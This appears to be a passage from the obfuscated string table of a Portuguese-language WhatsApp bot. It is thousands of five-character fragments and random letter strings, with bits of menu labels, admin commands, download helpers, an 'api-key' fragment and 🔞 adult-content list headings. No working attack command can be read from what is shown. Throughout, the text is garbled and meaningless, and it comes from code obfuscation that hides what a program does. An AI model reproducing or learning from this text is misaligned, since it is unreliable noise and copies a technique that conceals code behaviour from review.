'2|9|7', 'UjWxX', '_rati', 'KdRkU', 'GyAUb', 'expli', 'Ativo', "ot po", 'WKLmr', 'times', 'yuGfp', " nenh", 'qYErp', 'UNkgf', 'BCzHM', '9|3|4', " 🔞", 'EMAIL', 'links', 'ADOR', 'pjHec', 'eyAzl', 'JzPXn', "s doi", 'LnKlQ', 'ileSy', "ra os", "8 des", '-bot', 'IPbgp', " proc", 'intei', 'om/tr', "es vá", 'PafSj', "ICA: ", 'zmmjy', "73. ❄️", 'tTzqo', 'moqDb', " ante", 'AlxyX', "oubo ", 'ficul', 'NATbY', "a por", 'YSeQy', 'VuBCD', "o / g", 'BgBia', 'tlJEN', "O res", 'jjLVu', 'cnvaY', 'dpfYa', 'uitet', 'cTdEZ', " a pá", 'libra', 'IDEO', 'h-sco', 'on/af', 'tyaxc', 'HRLse', 'ttp', 'LiAXN', " term", "➽ DES", 'gnbLf', 'zzycH', '𝗠𝗘𝗦𝗧𝗜', 'hdVJB', 'lyVUp', 'sncNw', 'repor', 'SbPBy', 'po=1.', 'ortMi', ", ent", 'ccBGO', "o..\"", "eba e", 'nDgvI', 'ciaRi', "o Lim", 'fdfVX', 'oDykt', 'CsXYj', 'NeBon', 'cvelM', "    |", 'dd/v1', " ) nu", 'qHXOr', 'demot', "🤤 do ", "OS PO", 'FRyys', 'QjAEC', 'oCruD', 'JmdPO', 'SqfDc', "𝗫𝗜𝗠𝗢 ", 'ITMDq', "┌─⊷ *", 'xPjRQ', "𝗖𝗞 🇯🇵", 'VwaAc', 'êbado', "8. ❄️ ", "ece d", "NÇÃO ", 'selec', 'rmKLm', 'iKeQZ', "20 Go", 'eres', "hará ", 'QlvXs', " 🎌\n", 'ZmspT', "Tati ", 'wwqjO', 'bcecm', '2C_an', 'mQieJ', '*aqui', 'NsIjf', "m ate", 'NuPHs', 'qAkMt', 'OKlbR', "nk do", "🛠️ 𝐏𝐑𝐎", 'cas3', 'ads', "0 de ", 'idgru', 'xBTIK', 'oDXFr', 'e7a1d', 'Marca', 'getgr', "o _- ", 'eus', 'kDUVQ', 'pXrzg', 'yGjPH', 'ivar', 'dIiDZ', 'Tyddr', "\npara", 'hKdSa', 'MgmDY', 'antes', 'YhcDb', 'pCHkd', "0199\n", 'QvijP', '5a070', 'siobP', ". Sel", "s sua", 'mátic', 'rgalu', 'ENpnt', "ing t", 'uoUdf', 'LBDYf', "🔞 𝐕𝐈𝐓", 'aPFOG', "s. Ut", 'hwpJA', 'MreTE', "AS ♨️📛", 'Ziwpz', 'EGGYU', 'stos.', 'ASEwj', 'YQkiq', 'tiSrA', "na bo", 'bUmAr', 'TOwIk', 'yOQlo', 'ZXIxO', 'fuECg', 'ifEgQ', 'aVErP', " Pint", 'PJBHO', 'eDcTq', "🔪❧ @", 'icaçã', 'lQphl', "s) de", 'qMpUx', 'kmtGP', 'OZmxo', 'io.', 'ERROR', 'MEbue', '_INFO', 'mUuVR', 'nsMes', 'mpghD', 'teVgF', '=700&', 'VcLGa', 'paBgc', 'nmboN', " ausê", 'GyfrI', 'yjKgx', "i mar", 'kENRg', 'FTpcN', 'gsEty', 'HMPvW', "e qua", 'LQbCa', 'iteli', 'NDzso', 'JVqGl', "e apa", 'div#o', 'vFrNp', 'und.o', 'grilv', 'lada!', 'JIXpZ', 'EGXbO', 'Qxitj', 'MYIuQ', 'OYxcH', 'kDyuj', "vc já", " mas ", '𝐈𝐀🔥', "ÇÃO C", "🇯🇵 𝗘𝗟𝗔", 'lnZwS', 'aOKQz', 'CyugX', 'JjNMv', 'GFddu', 'DNpUQ', 'uGobn', 'eQjJj', 'lrICl', 'uthor', 'nljbQ', 'urinh', '0e843', " 🤖", 'lMHRt', 'PxDqk', 'CTvGA', 'FeLiN', 'hhOvH', '😡️', 'xHXZI', "IECE ", "um se", "ink é", 'lmrUJ', 'Tente', 'JZASw', 'voqxp', "l, ✂️ ", 'epAib', 'WLopB', 'qakIO', 'qWvsP', 'HdZHg', "o ter", 'ywqYo', 'BdmlU', "ca ne", 'qAULe', 'nscie', " KITA", 'IpgEM', 'itter', 'eLljn', " só d", 'rdPGd', "❄️ 𝐓𝐎𝐌", '?apik', "os ( ", 'JqlMB', " arra", "ze e ", 'RPyqX', " de d", 'khSgq', 'drShH', "deu f", 'evwwi', " 𝐍𝐄𝐓𝐄", 'ggSZM', 'tputO', 'YHoGk', 'PYGNg', 'kZRLn', 'co3Np', 'UtXEB', ", 2 )", '9rl9w', 'Bboar', "t sor", 'XpXqt', 'yGMup', 'aylis', 'KhAbN', 'bhwtV', "[ Pro", 'admau', 'pIaCk', 'YKhXh', 'cjbMu', 'GzVMU', 'to%20', 'DtySd', 'nlHRh', 'bjGBw', 'bQFOi', 'cUalA', 'Nwsbb', 'ropri', 'nkana', 'ssive', "stem ", 'htIui', 'XDZxN', 'fgpnl', 'QqVmF', 'PK+OB', 'dono3', 'YNkZg', 'enhNz', " Pess", 'eito:', 'Gring', 'async', "ra do", 'LezrY', 'peZyV', " (exe", "\n*4 -", "\n\n1 -", 'verme', "em me", 'XCsLN', "𝐃𝐃𝐘 ❄️", " 9954", 'YffFZ', 'ZzkqA', 'hOWaS', 'MoZIe', " -vn ", 'znYeP', " DURA", 'cfjlf', 'BRSLZ', 'dMFdN', 'WcyPj', 'YqwqN', 'izarl', 'CEpbu', "tos p", 'zBTrq', 'AYTNw', "a 20 ", '𝐍𝐋𝐘𝐅𝐀', 'QVwDx', "a cad", "🎥 𝟰𝟴𝟬", "62. ❄️", 'Legen', 'gpinf', 'bfetz', 'qkcdY', 'hkkfS', " AO E", 'zMpAj', 'FIdZp', 'WndBX', '21CMD', 'cmd-t', 'eRUuh', 'DWWDq', 'ago', 'CSnjC', "do au", 'GsXVc', "𝐔𝐄 𝐕𝐎", 'ultim', 'allpa', "de um", 'WITps', 'tViDz', 'MPNJI', " do g", 'LXyZy', 'OGRAM', 'ARbXJ', 'vGYbl', 'iguri', "ie.. ", 'kuSEu', "𝗖𝗛𝗜 🇯🇵", "ideo ", 'zRFXa', 'WBGVN', 'gMkty', 'ipoae', 'RfaIi', "ara a", 'ymKkL', 'NyFGJ', 'fMmUM', 'bjfUy', 'acRFg', " vai ", "ts hi", 'remot', 'UAODr', "\n*│* ", 'Ative', 'acima', 'mençõ', 'hisLE', 'zjNYc', '/?lan', 'QqVgb', 'iSyAn', 'CJJaF', 'izmen', 'falta', 'szGcz', 'zwckU', 'XYGBV', "s ráp", "Mas l", "uel: ", 'AvdXX', 'WSXpO', 'xjTSf', 'NgdJQ', 'ThQow', 'tyle=', "ɪᴀ💄  ", 'gina.', "o slo", 'bJuWB', 'Qahsk', 'jNYdB', "o / p", 'NUAya', " [🐃]", '/bail', 'oIyMW', 'UdweX', "\n - D", 'bsbco', 'pt-br', 'iHSpd', 'tlWGN', 'merch', 'SNrcR', "te !c", 'PaYHl', 'nsumi', 'rDLvg', 'xoYgf', "*\n#de", 'ClExw', 'gFttG', 'ompra', 'DGQHb', "2. 📍 ", 'BNFCZ', 'bwpSb', 'vLLPP', 'XebcV', 'wDobh', 'kgTVi', "ar: h", 'FlDgh', 'cRpvx', 'eTviP', 'vVklj', 'gEGre', 'WigvA', 'ptckm', 'xxqFt', 'JsIwM', 'bzhIb', "eiro ", "ega n", "NE TI", 'eland', "a cri", "\nO ex", "!* 🖤🌹", 'FkacW', 'rJUHw', "tt 1 ", '*VOCÊ', 'vdVgo', 'pow', '15b07', 'pxJru', '2|4|3', 'amipB', 'HpmBU', "u a g", "A vit", 'QqaML', 'Yjtbs', 'AlHVr', "ste c", 'Dados', "de de", 'mJaxY', 'EvkZg', 'szAiN', 'yixVY', 'uidad', 'utili', "s com", 'NosNW', 'ests', 'QvbqT', 'skrfK', "e eu ", 'ahTtI', "ta po", 'OPqbZ', 'RKOOQ', 'JCmxr', 'CFWIU', "XT (1", 'cWKMU', 'olhe.', "us: I", 'DWUmv', 'VDrAJ', 'lpAQw', 'gVCmS', 'titPs', 'wkgpN', 'GeeVl', 'vbsbE', 'HXXUf', 'AamrK', 'thKuV', 'xYziW', 'YuTNP', 'BjPLo', 'elopp', 'ZWyGX', "tem u", 'TmwDk', "Foto ", "er.. ", 'hikfI', "em di", "IDOS ", 'ylvJD', "o Liv", 'cBqEd', " a tr", '236x3', "oco s", 'pi/sp', " Ta O", 'mrHrk', "𝐊 𝐓𝐀𝐓", " o al", 'dara', 'JpVMt', 'aNvUa', "do te", 'imes/', "rv pa", " tira", 'ricos', '3|4|1', " humi", "as se", 'ertid', 'aXUJD', 'bloqu', "ra De", "tipv ", 'nteme', "ado c", 'OOpTE', 'jjxJq', 'mero)', 'XFPNo', 'BwdrE', "A ❎*", " Do G", 'FbydO', 'PiMjK', " 10 G", "se ar", "ts ku", "Sua c", 'hfwHg', 'yqZkQ', 'nslat', 'lerwq', 'TrWJp', 'DcxhR', 'xiymJ', " de: ", 'VEfkI', " Essa", " 🐂\n\n", "o Rep", 'evahK', "imo 1", "VADO ", "e uma", 'exp', '────┈', 'Pnosa', 'JvqQg', 'jGJeX', 'UupAN', "beu 5", 'bQBOb', "s\n\n2:", 'PVsNY', "ANS\nh", 'PAiEA', 'OMBER', 'fzuAT', 'pando', 'NrHKn', 'jQnIy', 'MTIKF', 'do.', 'dPIOT', "do o ", "R HOL", 'qcsyk', 'UzXkQ', "nho u", 'mdOus', 'lsUOH', 'bXPdh', " míni", 'mnfIq', "ar áu", 'fGFTz', 'www.m', "er da", "ece a", 'lgxAO', 'DSwPM', 'cxvRv', "r de ", "O alu", "🔆 • S", 'qdlBK', 'views', "m err", "e.\n", 'qkrBT', 'UOBvk', 'lsort', " Usan", " :\n\n", "╰╼╾❲ ", "y que", 'tOlcq', 'BJDpV', " alte", 'Moeda', "one o", " estã", 'PmAot', 'Recru', 'LxJxW', "ção a", 'MuOaQ', 'jqAZS', "nta m", 'ddFCT', 'vZLeR', "io qu", "ue ❌", 'o|Nom', 'cLlGw', 'rMELU', 'rever', "x, po", 'ᴏᴛᴀᴋᴜ', "16. ❄️", "28. 🔞", 'VBPKg', 'DomgR', '80e76', 'HQrxk', 'UADxo', 'ND2Sm', 'zXnaV', 'YkUzz', 'IFkcG', 'PHmce', 'nJiAS', 'EKFMu', 'Metad', "o 」", 'bNfIe', 'QnmAT', " cons", "ne 🙂", 'uiPAI', '.spot', 'MgkIX', 'efPXg', 'oubar', "jo go", 'qzGoV', " link", 'vqBwF', "o 10 ", 'd9452', 'FDQcz', " ]\n*A", "\n*Pos", '4P766', "𝐂𝐄̂ 𝐏𝐄", 'ASPRi', 'esafi', 'IYhWa', "um pe", "Grau ", 'GjFqC', "\nprem", '10196', 'Vocês', "e a e", 'PkIVE', 'NpNiD', '=Img&', 'rLrZs', '8Fy2M', " 💨\n💨", "ram e", ") foi", 'playd', 'ruto', 'rtAJD', 'time/', "é de:", "ça do", 'Vzf0r', 'cyFWj', "s cli", 'lgbt', "m cas", 'HzPdf', 'qVtto', 'JKBLG', "le re", 'dreas', "ugar ", 'niFJm', '0ccR6', 'vado.', "nda a", "𝐔𝐓𝐎 𝐅", 'emons', 'uEumf', "va de", 'calcu', 'ntes.', ", ess", 'jZGZu', "?\nPar", 'rack/', 'pt2', "p/ o ", " 𝐁𝐀𝐑𝐁", "\n\n╔┉✼", 'mSqdw', 'EZoDG', 'fjLzm', 'Detec', "ig ob", 'refus', "erá c", 'ymNdC', '3|2|1', 'rno', " ⋆⃟ۣۜ᭪", "or, r", "Erro ", 'BtvcJ', ':g=30', 'qoOTh', "\nURL:", "f [p]", 'gif/l', '7|1|8', 'wukfw', 'yvGqH', 'QqtAR', '://wa', "em um", 'fdLvk', 'ook_v', 'Oswdf', "│+ ", 'fsFGB', 'timeV', "M nes", 'GTRxq', 'Opçõe', "upo 😗", 'hold', 'TfMaJ', "11. ❄️", 'Motiv', "sso! ", 'BrhFX', "¦_\n\n\n", 'tbvUz', 'foBJj', ":\n\n- ", 'ieinS', 'CRIÇÃ', 'QJUtC', "pe ou", " 0\n\nM", 'CjISV', 'cBUax', 'DhsKQ', 'LZmGd', 'ncher', 'ziIbl', 'xOyHK', 'WYxUR', 'aORWP', " The ", 'xBiGv', "═╩══\n", 'daoUM', 'om/re', 'dchPn', "🔞 𝐏𝐎𝐋", "etra ", 'xuXul', 'pdSRa', 'ZBZKL', 'andro', 'lvzCy', 'cXoeY', 'PxbJn', 'IjYPJ', "ocê:\n", " Chan", 'bhCrk', " oque", 'eJpwJ', 'UutVL', 'MS..', "o vid", "o adq", 'AvarO', 'dPqMq', " terc", 'qkpBz', 'KaWjK', 'tjbqw', "d due", 'IqblY', "gual ", '.6,as', "a não", 'AtPgN', 'orno', 'wpoSQ', "em\npr", "itar ", 'qhZBx', 'tkYMl', 'gestõ', 'qgUSb', 'i-key', '1.zip', 'bHquN', "k, sp", 'cPywh', 'RcgzD', 'f0dd0', 'HVAqT', 'M.*', 'JrBRk', 'yygGQ', 'rLTGI', 'única', "Até q", "o hor", 'DJADu', "a vot", "ADM: ", 'UnXWg', 'dzIzT', 'tivo.', 'CmuhV', '24IMh', 'os|', "o e d", '54002', " ❌😕_*", 'code', 'equal', "nte u", 'DONO:', 'peRAt', 'nFUVK', 'uki/%', ". Ver", 'JlBUx', "e dos", "so us", 'aperp', "o Avi", 'qZZCl', 'co!', 'mimet', 'llSWx', "prar ", 'oAIMp', 'ai...', 'char-', 'quJMk', 'WqMuv', "8. 🔞 ", 'hLgYw', 'NoIHU', 'ative', 'IBays', " novi", "s cri", 'CNZen', "o Exe", 'BQoaB', 'eAgen', "/2, t", "nha d", 'WALFJ', 'dMXva', 'arcaç', "🔞 𝐋𝐄𝐓", 'KziRJ', 'os.', 'cas-2', 'iFLCm', 'ado*', 'juXde', "do fu", 'atalo', 'Wvmsm', "no pr", 'SAktg', "𝐕 🔞", "ao nú", 'rUJYp', 'qiEkI', 'e838d', 'uMsFe', "✓ Ati", 'BGoSY', "❄️ 𝐔𝐙𝐔", " 𝐋𝐀𝐘 ", 'EJgXA', "se mi", "é a q", 'tEkPW', 'Zgvmc', 'utf8', "Oi @", "er At", "ADMs ", 'LGFeG', 'XcQAj', '45678', 'ROiUQ', 'titul', 'und.c', 'ZANcs', "ns: ", 'dessa', "CLEO\n", 'jcqwh', " ter ", 'WbXBM', 'pQDdS', "sso a", 'RECIS', "s ago", 'a9289', 'coest', 'TxQDL', "7. 🔞 ", "ode u", 'sar*_', "🌹\n2 -", 'NqPDN', 'jiLDC', "m suc", 'bRFHA', "iu ro", 'openw', 'bBzmE', 'alend', 'SqDsQ', 'cAoOD', ", cas", 'FAVOR', '126+M', "O:* c", 'e=gen', "a/24 ", 'RyaQF', "i, ou", 'DGAYM', 'PESQU', "𝐔 ❄️", 'membr', 'zrAzp', "Use a", 'uCqEg', " | ", '5|4|3', 'oleta', 'AGxfN', 'nXplv', "*Seu ", 'o-24h', 'jntrx', "irou ", 'meuti', 'tnqYI', 'r=002', 'memor', 'mdoKd', 'rTVpn', 'uBfPl', 'fdsHu', 'reali', 'vVmTX', 'CkZjH', 'kgiwr', 'HohDC', 'rVoQS', 'kUigP', "ra eu", 'nEFro', 'DEKOO', 'ngUpd', 'BqFhK', 'zLWgl', 'bBQLp', 'oc7', 'JNEri', 'oesdo', 'ehu-w', 'btiPK', " DESC", "al: ", 'UUJsi', 'jPHWs', '|2|4|', 'rd.st', " nova", 'erfvI', 't.sty', 'eiqwl', 'Vnsmp', "ara s", 'Defin', "asta ", "% ✨ d", 'KJVzj', 'GCveX', 'vZsJa', 'PdADB', "20. 🕹️", 'donom', 'dlghA', 'gBjHW', "ICO P", " anti", 'PING', "「 TRA", "ique ", 'lIegj', 'lbgun', 'Mblki', "?\n\nEx", "\n\n\n", "u com", 'PPyHf', 'yAZmY', "ir ", 'yHywp', 'hbTYc', " mano", 'ndo2', 'DRAGO', 'NhnEE', "otas ", " nume", 'cálcu', "~ ⚔️ A", "3 por", 'ayGye', 'ecwNg', 'GSRKo', 'HrPnI', 'bKXKr', 'kSFXA', 'Ponto', 'ódigo', "  \nCo", 'zoYzu', '5ibji', 'nselh', 'TpNtx', 'yHUYW', 'MXrDa', 'ekxSg', "ural ", 'Ucoav', 'CzRKa', 's/McP', 'kfGGj', 'bddTb', '19e7a', 'anima', '𝐀🔥', 'OQLFO', 'pGBqq', 'sBHCg', 'd9b00', 'erfil', 'lhjqw', 'VcIan', 'guint', 'MunLc', 'WHvLz', " -vf ", 'iXTIM', 'YXmkW', 'VltvV', "🚨🚨\n\n*", "o.. O", 'rhTSI', "iba q", 'ehiXz', 'fbevS', ", bom", 'uZqls', 'tEkiu', "Bot: ", 'bcfPc', " .mat", 'srDgA', 'xNTYF', " ness", "ido, ", 'pnhQL', 'aTvyx', "do an", 'certa', "ue há", 'zeKgk', 'LOHrW', 'GhprB', "a pôs", "HÃ VO", 'celad', 'LIYrj', 'suke', 'otus:', 'TNMnu', "\n\ncas", '𝐌𝐄𝐍𝐔𝐒', 'uHJkT', 'Dqlrg', 'SNYXK', 'dmini', " ]🗿* ", "se cm", 'mEHEi', 'nata', 'Ppkbt', 'lpeYi', "ipt a", 'gOzUd', 'motiv', 'RKEyv', 'KGcFR', 'nebwM', '01bc4', 'RwPIL', "o* : ", 'IUoaz', "」*\n\nG", 'nhas.', 'XgdaB', 'LmkiM', 'uanti', 'iCOQU', 'espos', "f are", 'appro', "Pode ", 'moji!', "ra K7", ", Par", 'kElpL', 'ncyCo', 'PVUuK', 'zKxbn', 'ddABr', 'lembr', 'essão', 'SZFBo', 'BdYSQ', '|2|3|', "s nes", 'vn/v1', 'RUGTj', 'nGDpp', 'GL3a8', 'exist', 'YqoCI', "bar, ", 'ISTIR', 'cup2', 'asfal', '1.pos', '30d', 'PRYDk', 't?q=S', 'RAJbL', "ji Do", 's_202', 'HZrST', " 😁👉👈❤", 'KqvKj', 'DotEN', '4|2|1', 'MGZVQ', " só c", " Deve", "_- JO", "el, e", '0MWpT', 'ujLkj', '*Você', 'gamen', 'CevjU', 'YvyBe', "ado a", 'l-VnN', 'uhThC', "ntou ", 'OOpFP', '.team', 'aOyYd', 'vYufI', 'NZWCH', 'stoso', 'antif', 'SFcNp', 'wpDLe', 'json&', '-visi', " 📽 𝑽𝑰", 'etici', 'ipZzz', 'óximo', 'posiq', 'DOS/N', 'MoVFl', 'HXqzx', 'rankn', 'BFRIp', 'UKeoQ', 'TrPIy', 'rvyCb', 'BStcR', 'jHsIK', 'sEoXG', 'yzFyO', 'zbHbl', "a Eli", 'ercei', ": @12", '0|3|2', "%*\n😋 ", 'MCdju', 'dium%', 'CnrNh', 'fXQGI', 'on/hr', 'hVPsm', 'AhBYu', 'po=2[', 'TMiAi', 'ctXTG', 'gLqSY', 'NUioq', 'sxb55', 'nwikF', 'er.', 'uAFjI', 'DtZMm', 'JwLsl', " OBIT", 'spwyb', ": 123", 'fotos', 'RhSjk', 'magin', "NDOS ", 'ou!', 'lho:*', 'FUpoQ', 'VdfsV', "i Gol", 'bivAj', 'TFjTa', "ico (", 'NxZjQ', '4|1|3', 'coes_', "2: ", 'mArhI', "🇯🇵 𝗪𝗔𝗟", 'MtHbA', "ó pod", 'WQfIb', "ig ja", 'EEoru', 'KiCSZ', 'numbe', "rar c", 'Spbul', 'DtONF', 'ojpMW', "ts yu", 'qXLtd', 'uyjqQ', 'wy01n', 'KURaz', 'acter', " em 5", "A DO ", 'xkyGZ', "r tir", 'Time:', 'rados', 'FMPnJ', 'KstlI', "om um", "𝟔 🔞", "el\n\n_", "🔞 𝗣𝗥𝗢", 'kVAtL', 'admin', "u núm", 'Nzfwf', "e '@'", 'gYave', "do De", "zar e", 'offse', 'KGIZY', 'REIJj', 'woQxH', '_nota', "\n\n￣￣￣", 'RatJt', 'lLxZH', "𝐔𝐑𝐀 ❄️", "eio, ", 'cutar', " Delp", 'VBwhz', "re em", "𝐔𝐆𝐎𝐔 ", " )\n", 'puEiQ', 'tZUmX', 'qGztf', 'ukbVX', 'xWVlR', "21. 🕹️", 'ade*', 'crWVS', 'xbVcv', "sh; I", 'sTVGM', " Marc", 'iBrit', "𝐈 𝐀𝐔𝐃", 'HhUBa', 'antos', 'erten', 'WAnIh', 'Qwmbx', 'inado', 'EnwEo', 'ydhkU', " 𝐃𝐎 𝐇", 'média', "uto\nE", "ot no", 'EUIfd', 'rokMk', 'tpfXX', " no h", "rá na", 'FbpmL', 'lor=0', " tá n", 'VaAhc', 'HJbRn', 'DLlDk', "ize ", "pe, a", 'ransm', 'Zpvwy', 'lrefi', 'teres', 'ycWiT', 'kUHCr', 'VZdlg', 'BswtA', "r Gol", 'lauso', 'MlpGg', 'oiRhW', "o o j", 'on/me', 'OZLUD', 'WdolS', 'HIkoy', 'nrOrr', '𝐑𝐒𝐆🔥', ", ins", 'nvert', 'xYnFt', 'delre', " 𝐆𝐑𝐔𝐏", "ver s", 'arde,', 'LVsJr', 'tifak', 's/Bre', 'BrAcg', 'hasOw', 'ymZXO', 'sf54V', 'Feioo', 'tbody', "┆    ", 'WsFAH', '🇯🇵', " -rf ", 'gXlVq', 'leato', '𝐈𝐍𝐇𝐀𝐒', 'PoYDy', 'uel2', 'laxTU', 'nYApH', "ig ro", "ra re", 'uiJnq', 'xAKfZ', 'TduPh', 'hlXvW', 'LMFdY', "M 」--", "ios c", 'VLoue', '140', 'emzzs', 'uMIxW', 'oGhUE', " é ga", "ema c", 'aLdtU', 'renov', 'bGafz', 'LvbCW', "*「 ❗ ", 'parab', 'go:', 'wGQaR', '5|6|1', 'NdjKO', 'tos!', 'paten', "r men", 'rankh', 'UKqsj', 'ytdl-', 's/raw', " 🇩 🇪 ", 'iSNJB', 'on/rg', 'carac', 'riado', 'umaWp', 'IrkZV', "ema: ", 'oquea', 'ubKTC', 'DrOfT', 'rXxBi', 'LjEnI', 'ixleF', 'bbLaf', 'SRqDi', 'l1eIS', 'vjYvk', " tard", 'gory=', 'mYmzr', 'freem', 'BMyDP', "R NÚM", 'Agrad', '@whis', 'AvcMs', "ds, e", 'wAKmB', 'bwgdn', 'Mkawk', 'EInVm', '|1|3|', 'zvBrq', " span", 'zgDqy', "---*\n", " baum", 'lZZcF', 'dIsaZ', 'wIRai', '85bcc', 'YcIzp', 'not-a', "s. Ca", 'vítim', 'XZfJN', 'LUMnf', "──┐\n│", 'MuZZu', "so? V", 'mADRX', "ix nã", 'UhczJ', "N TIG", 'YCZEz', " RAM ", 'npJrl', 'Qhzjk', 'JQLFG', "ano1 ", 'gjjKO', 'tAQaX', "do pe", "o ven", '𝐈𝐍𝐃𝐀𝐃', "po ou", 'OiKeY', 'TuLuF', 'QkTHs', 'pXZZA', 'JGisf', 'RstWQ', 'kJbaL', 'yzcgx', '─────', 'ZdZtJ', " DE Z", 'ile/d', "e dig", 'ijTKH', "\n• *T", 'adWaC', 'on/fr', "s no ", "*\n• N", 'UWUST', 'qyIvV', 'magen', " Mari", "odo B", 'escul', 'rgold', 'muJdb', 'HugNy', 'obter', 'vHGYq', " Adic", 'FrjEv', "S🔞\n\nL", '*Comu', 'USADO', 'iXnkl', 'OS/gr', 'hgQCb', '7a011', 'rxYax', 'jZmef', 'ENULK', 'ile/e', 'LrkDE', 'mplos', 'DuBWX', 'Qtrcb', 'mInZv', 'eBfBd', 'dOAdo', 'usênc', "e ape", " O qu", "r o b", "lo:\n", 'jogo1', 'aagSs', 'xwTxI', 'ZeCML', 'VIjoJ', 'HjSVk', 'kuFNO', " figu", "tas e", "nte 1", "o tex", " 20 G", 'IFabo', 'uto-2', 'Dios&', 'Uqeef', "eb シ", " a:* ", 'ieren', "a fac", 'dade', 'BirEN', 'coloc', 'ers/', 'ake_z', 'PyzYf', "o sab", "u, le", 'descg', "ncia ", 'getGe', "\n\n🤖 𝐓", "lão f", 'SEfhX', 'kbtzt', 'oted', "te gr", 'ho.', " 🎽\nPo", "BR)\nh", 'ile/b', "ODOS ", 'ykGCk', " Resp", 'cases', 'pKDRl', "á nen", 'ViCJ6', "ocê f", 'ctgpn', "a rou", 'PTIqE', 'TEROS', 'bitco', "udio ", 'QiouF', 'rst', 'TImHm', "o mod", "ar. T", 'HXygV', 'ANIME', 'omece', 'lJywp', "m 3 a", 'iHZvZ', 'BOciE', 'glNkm', "f\n\n- ", 'zZbkJ', 'fGRKe', '-mp4/', '𝐈𝐍𝐇𝐀𝟏', 'oJFZK', " a me", '1def9', 'iWcwa', 'EVMoq', 'jvyDL', 'ATzEg', "do al", 'woyFB', "o res", "ais d", 'sampl', " goog", 's/Cam', 'nkWHQ', 'TyofQ', "𝐄𝐒𝟒 ❄️", 'ZFiCT', "ida d", 'lnYIw', 'lfKea', 'embre', 'xfAhL', 'vação', "ado.\n", 'MhwGr', 'jUpBJ', "alho ", 'HMEBo', 'ortei', 'fig', 'vnADb', "4 hor", 'SsELj', 'IVING', " defi", "meu n", " \n\n", 'ifiqu', 'TSAXy', 'ljIWX', "pam 0", 'deira', '/anim', '|2|4', 'qnoZK', 'ipwkM', "l tra", 'QimQb', "te fu", 'bBGxv', "OS OS", 'XFTHb', "M Usa", " @Xpe", " Se o", 'NaRFF', "𝗜𝗠𝗢 ", 'sBfvU', 'XLViP', "\t\t\t\t\t", " 🔥", "s gps", 'INHAS', 'KASqm', " Pix ", 'isita', 'FXqeg', 'lastI', 'embar', 'lUNLZ', 'HKJrb', 'eterm', 'HsDSg', 'GoeBd', 'adesi', "u a T", 'neBSG', "O sen", '9219f', "irar ", 'CmHIM', "\n\n- [", "*\n\n*Q", 'itama', 'euneV', " d é ", 'cUwcN', 'fOHyp', 'OD.ap', 'WTaVG', 'pRdQW', "evel ", 'wXqjg', 'WMkQU', 'mOPor', 'tUJaJ', 'ation', 'dEHVQ', 'PvPJh', 'd.jso', 'ipant', '67800', 'csHoK', "uma r", 'renda', "o sit", 'IiBOp', 'LBWXj', 'CzcnQ', 'gZXRt', 'TENTE', 'nBrlm', 'WfHmw', "u arq", 'PdWql', "Boa s", " mesm", 'QfQen', 'WDvmK', 'WgUwY', 'ionar', 'd.apk', 'ZYUyX', "Quem ", "em: ", 'NFoHo', 'LRrjJ', 'Wzyow', 'vtycB', 'sBCEV', "rar d", "▄◢◤\n█", 'aXWor', "go, a", "a : ", 'GohYS', 'xuXwv', 'type', "🤖 Des", " rese", 'UqPLA', 'GBBZj', "u rem", 'PlJtD', "ime d", "OS AT", 'ROUJd', 'YOaLg', 'start', 'HOjVx', 'DeeWb', 'mFFWK', 'vKlmQ', 'IcSBv', 'ɪᴍᴘᴇᴢ', 'tEpSk', 'erado', 'imens', 'aTfXm', 'GsYwa', 'MTtnP', 'LLeTz', 'RCUFm', '://x.', 'mutad', "i ten", "𝐎𝐓𝐎𝐒 ", "57. ❄️", 'lhant', " em c", 'osta,', 'IvJtO', 'ppSFS', "0 min", "so, e", 'TMokq', 'HCqvu', "ando\n", 'qtwuB', 'botad', " BOT\n", 'asame', "es já", 'b5f12', 'qopmp', 'rvjSk', 'ON:3.', 'Votou', 'cCOtx', 'KwcWZ', '/simt', " porq", "𝐀𝐃𝐎𝐑 ", 'scJQh', "eço q", 'QFnxA', 'jPiVH', 'lGcSJ', 'wkzIA', 'VbsHn', "K DE ", "t des", " Espe", "𝟒𝐊 🔳\n", "do re", 'curso', "já co", 'BBeBO', 'scPjr', "osso ", './con', "dor p", 'BcKVm', 'PVUyg', 'dicoo', "s not", "\nTemp", 'cBHYR', " 𝐋𝐈𝐒𝐓", 'DvHBz', 'YjKdL', " 3 Go", "App w", 'rianç', "1. ❄️ ", 'cMBRz', "ID: ", 'tispa', 'BvloS', 'FLfoE', 'JFnnQ', 'TooMX', 'bwWhN', "d Par", "ir AD", 'bhdLr', "Logo ", 'quele', "ra : ", ", PAR", 'dXIPD', 'vlLxA', 'HFUTo', 'zuKKO', 'OnDur', 'xOOOn', 'utEHW', 'fbAdL', 'gxnvp', "logo ", 'mio.', 'szJyk', 'qCqkz', '20Par', 'FHuFG', "o a v", 'hHWbi', 'SnIoH', 'rdIyd', 'Coman', 'ZXfJd', 'ia...', 'luFpf', "ua pr", 'ile/9', 'OGUUG', "-> ", 'uando', 'EHEQJ', "deo o", 'LiKhU', 'XjHg/', 'zDnHT', "ao es", "ça já", '𝐞𝐬𝐮𝐥𝐭', 'upo✔️', 'amsJs', 'horro', " \n*Re", "stes ", 'pFScr', 'qTuHI', "𝐁𝐈𝐄 🔞", 'zmznU', 'egFPR', '[🔴]', "bos d", 'rie-a', "SAO D", 'lINPT', 'cta_u', "e tít", "UPO 😏", 'CxGmm', 'uzTLw', 'cBzjS', "s mel", 'xuwdI', "o em ", 'nakgm', 'oster', 'dupli', 'OICE;', 'tos', 'qCVWH', 'doeTB', " A PA", 'ranki', "da pa", " Resu", 'bvcmQ', "\ndica", 'XKGiL', 'Cex', 'TmbKp', "ei a ", 'JwYHg', 'RDHSr', "UNTA ", "-se q", 'eling', "cê es", 'faruJ', 'eeBsD', "COOT\n", " meu ", 'sBLvb', 'packt', 'b331c', 'PfKtJ', 'yCFee', 'Wgqul', 'ia..', 'emfky', '𝐔𝐑𝐈𝐍𝐇', 'JwgCN', 'oc2', "\n\nEu ", "81. ❄️", 'OXaNJ', 'LMNBZ', 'PiYfG', 'ffjkn', 'rce-l', 'qQKhL', 'KUahF', "18 1 ", 'XayID', "\nInic", "ix en", 'aPjNw', 'LMRJu', 'tiliz', 'set', "lha u", 'AMnXO', 'FWhts', 'bGULr', "📀\n4 -", 'VllQs', "oa so", 'HrGod', 'SauLA', 'LnfIf', "🇯🇵 𝗜𝗡𝗢", 'sTMDZ', "R UMA", "O ABE", "m tod", 'hiXBl', 'nHlPS', " derr", 'aUmUU', "l 😳", 'sEFKm', 'cdd83', "W\nhtt", 'lctPQ', 'cEHVY', 'menue', 'NtVAJ', 